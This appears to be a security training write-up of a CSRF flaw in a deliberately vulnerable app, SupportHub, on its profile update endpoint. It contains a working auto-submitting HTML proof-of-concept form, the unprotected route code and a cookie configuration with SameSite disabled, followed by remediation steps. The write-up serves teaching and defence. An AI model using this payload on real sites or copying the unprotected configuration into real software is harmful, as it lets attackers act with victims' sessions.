# Cross-Site Request Forgery (CSRF)

## Vulnerability Summary

| Field | Details |
|---|---|
| Application | SupportHub — Vulnerable Edition |
| Vulnerability | Cross-Site Request Forgery (CSRF) |
| Severity | High |
| CWE | CWE-352 |
| Affected Feature | User Profile Update |
| Affected Endpoint | `POST /api/profile/update` |
| Authentication Required | Yes |
| Testing Environment | Local training environment |

## Description

The SupportHub profile update endpoint performs a sensitive state-changing operation without requiring a CSRF token or validating the request origin.

The endpoint relies only on the user's active session cookie. Therefore, an external page can submit a forged request to the endpoint while the victim is signed in.

During testing, a separate page running on port `5500` successfully changed profile information in SupportHub, which was running on port `3000`.

## Affected Endpoint

```text
POST /api/profile/update
```

## Affected Files

```text
src/routes/profile.routes.js
src/app.js
docs/poc/csrf-profile-poc.html
```

## Preconditions

- SupportHub is running on `http://127.0.0.1:3000`.
- The victim is signed in to a valid SupportHub account.
- The victim uses the same browser to open the external proof-of-concept page.
- The CSRF test page is running on a different origin, such as `http://127.0.0.1:5500`.

## Proof-of-Concept Page

The following HTML page submits a forged profile update request:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Proof of Concept</title>
</head>
<body>
  <h1>External Training Page</h1>
  <p>Submitting a cross-origin profile update...</p>

  <form
    id="csrfForm"
    action="http://127.0.0.1:3000/api/profile/update"
    method="POST"
  >
    <input
      type="hidden"
      name="jobTitle"
      value="CSRF Proof Confirmed"
    >
  </form>

  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```

## Steps to Reproduce

1. Start SupportHub:

   ```powershell
   npm run dev
   ```

2. Open:

   ```text
   http://127.0.0.1:3000
   ```

3. Sign in using a valid demonstration account.

4. Open the Profile page.

5. Confirm that the current job title is:

   ```text
   Support Administrator
   ```

6. Keep the SupportHub session active.

7. Open a second terminal inside the `docs/poc` directory.

8. Start a separate local web server:

   ```powershell
   python -m http.server 5500 --bind 127.0.0.1
   ```

9. In the same browser, open:

   ```text
   http://127.0.0.1:5500/csrf-profile-poc.html
   ```

10. The external page automatically submits a request to:

    ```text
    http://127.0.0.1:3000/api/profile/update
    ```

11. Return to the SupportHub Profile page and refresh it.

## Actual Result

The victim's job title changes to:

```text
CSRF Proof Confirmed
```

The change occurs without:

- A CSRF token.
- User confirmation inside SupportHub.
- Origin validation.
- Referer validation.
- Re-authentication.

This demonstrates that an external origin can perform an authenticated state-changing action using the victim's active session.

## Expected Secure Behavior

The server should reject any profile update request that does not contain a valid CSRF token.

A forged request should return an error such as:

```json
{
  "error": "Invalid or missing CSRF token."
}
```

The victim's profile must remain unchanged.

## Vulnerable Back-End Code

The affected endpoint is located in:

```text
src/routes/profile.routes.js
```

The endpoint accepts and processes the request without CSRF protection:

```js
router.post('/update', (req, res) => {
  const current = db.prepare(`
    SELECT u.email,
           p.first_name AS firstName,
           p.last_name AS lastName,
           p.job_title AS jobTitle,
           p.timezone
    FROM users u
    JOIN user_profiles p ON p.user_id = u.id
    WHERE u.id = ?
  `).get(req.session.user.id);

  // Profile information is updated without validating a CSRF token.
});
```

The route checks only the user's session through:

```js
router.use(requireSession);
```

A valid session confirms that the user is signed in, but it does not prove that the request was intentionally submitted from the SupportHub interface.

## Vulnerable Session Configuration

The session configuration is located in:

```text
src/app.js
```

The vulnerable edition does not provide sufficient CSRF protection:

```js
cookie: {
  httpOnly: true,
  sameSite: false,
  secure: false,
  maxAge: 1000 * 60 * 60 * 4
}
```

The application also does not validate the `Origin` or `Referer` request headers.

## Root Cause

The vulnerability exists because the application:

1. Uses cookie-based authentication for state-changing requests.
2. Does not generate a CSRF token.
3. Does not include a CSRF token in the profile form.
4. Does not validate a token on the server.
5. Does not validate the request origin.
6. Accepts form-encoded cross-origin requests.

## Security Impact

An attacker could cause a signed-in user to perform unwanted actions, including:

- Changing profile information.
- Changing the account email address.
- Modifying account preferences.
- Performing other sensitive actions if additional unprotected endpoints exist.
- Taking actions with the victim's permissions without knowing the victim's password.

The attacker does not need to read the response for the unauthorized state-changing action to succeed.

## Evidence

### Forged External Request

![CSRF external request](../screenshots/csrf-external-request.png)

### Modified SupportHub Profile

![Profile changed through CSRF](../screenshots/csrf-profile-changed.png)

## Recommended Remediation

The secured edition should:

1. Generate a cryptographically secure CSRF token for every authenticated session.
2. Include the token in every state-changing form or request.
3. Validate the token on the server before processing the request.
4. Reject missing, invalid, or expired tokens.
5. Configure session cookies with an appropriate `SameSite` policy.
6. Enable secure cookies when HTTPS is used.
7. Validate the `Origin` header for sensitive requests as an additional defense.
8. Avoid using GET requests for state-changing operations.

## Verification Criteria for the Secured Edition

The vulnerability will be considered fixed when:

- The legitimate Profile form includes a valid CSRF token.
- The server validates the submitted token.
- Requests without a token return an error.
- Requests with an incorrect token return an error.
- The external proof-of-concept page cannot modify the profile.
- The victim's profile remains unchanged after opening the attacker page.

## Conclusion

The CSRF vulnerability was successfully reproduced in the SupportHub vulnerable edition.

A page running on a different origin submitted an authenticated profile update request using the victim's active session. The SupportHub server accepted the forged request because it did not require or validate a CSRF token.